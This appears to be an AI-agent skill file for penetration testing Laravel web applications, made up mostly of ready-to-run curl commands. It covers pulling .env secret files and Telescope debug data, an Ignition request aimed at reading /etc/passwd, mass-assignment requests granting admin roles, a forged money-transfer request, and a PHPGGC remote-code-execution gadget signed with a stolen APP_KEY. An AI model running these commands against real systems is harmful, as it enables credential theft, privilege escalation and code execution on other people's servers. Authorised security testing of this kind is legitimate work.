---
name: framework-laravel
description: "Laravel security testing — .env file exposure, debug mode info leak, mass assignment via Eloquent, Laravel Telescope exposure, queue deserialization, CSRF bypass, route listing. Triggers: 'laravel', 'php laravel', 'laravel security', 'laravel env', 'laravel telescope', 'eloquent injection', 'laravel pentest'."
---

# Laravel Security Testing

Laravel attack surface: .env, Telescope, mass assignment, debug mode, queue deserialization.

## Phase 1: Fingerprinting & Info Disclosure

```bash
TARGET="https://TARGET"

# Detect Laravel
curl -sI "$TARGET" | grep -i "laravel_session\|x-powered-by"
curl -s "$TARGET" | grep -i "laravel\|csrf-token\|_token"

# .env file exposure (critical)
curl -s "$TARGET/.env" | tee /workspace/output/laravel-env.txt
curl -s "$TARGET/.env.backup" | grep -v "^#\|^$"
curl -s "$TARGET/.env.example"

# Laravel Telescope (debug dashboard)
curl -s "$TARGET/telescope" -o /workspace/output/telescope.html
curl -s "$TARGET/telescope/api/requests" | python3 -m json.tool
```

## Phase 2: Debug Mode & Route Exposure

```bash
# Trigger debug mode errors
curl -s "$TARGET/$(openssl rand -hex 10)" | grep -i "APP_DEBUG\|whoops\|stack trace\|laravel"

# Route listing (if debug=true)
curl -s "$TARGET/_ignition/health-check"
curl -s "$TARGET/_ignition/execute-solution" \
  -X POST -H "Content-Type: application/json" \
  -d '{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"email","viewFile":"/etc/passwd"}}'

# Exposed phpinfo
curl -s "$TARGET/phpinfo.php" | grep -i "php version\|system\|document_root"
```

## Phase 3: Mass Assignment via Eloquent

```bash
# Test extra fields in registration/update
curl -s -X POST "$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"name":"attacker","email":"attacker@evil.com","password":"Password1!","is_admin":true,"role":"admin","verified":true}'

# Profile update with privilege escalation fields
TOKEN="BEARER_TOKEN"
curl -s -X PUT "$TARGET/api/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","is_admin":1,"role":"superadmin","credit":99999}'
```

## Phase 4: CSRF Token Bypass

```bash
# Laravel CSRF — check if API routes bypass middleware
curl -s -X POST "$TARGET/api/v1/transfer" \
  -H "Content-Type: application/json" \
  -d '{"amount":1000,"to":"attacker"}' \
  -H "X-Requested-With: XMLHttpRequest"

# SameSite=None check
curl -sI "$TARGET/login" | grep "SameSite\|Set-Cookie"

# CSRF via JSON Content-Type
curl -s -X POST "$TARGET/password/email" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'
```

## Phase 5: Deserialization (Queue/Session)

```bash
# Laravel uses PHP serialization for queues
# Test cookie deserialization if APP_KEY exposed
APP_KEY="base64:EXTRACTED_KEY=="

# Generate deserialization payload with PHPGGC
# phpggc Laravel/RCE1 system "id" --base64
# Use extracted APP_KEY to sign payload

# File storage exposure
curl -s "$TARGET/storage/app/public/" -o /workspace/output/storage-listing.html
curl -s "$TARGET/storage/logs/laravel.log" | tail -100
```

## Output

Save to `/workspace/output/`:
- `laravel-env.txt` — .env contents (critical)
- `telescope.html` — Laravel Telescope dashboard
- `storage-listing.html` — public storage exposure

## Next Phase

→ `vuln-mass-assignment` for detailed mass assignment testing
→ `vuln-deserialization` for PHP deserialization exploitation
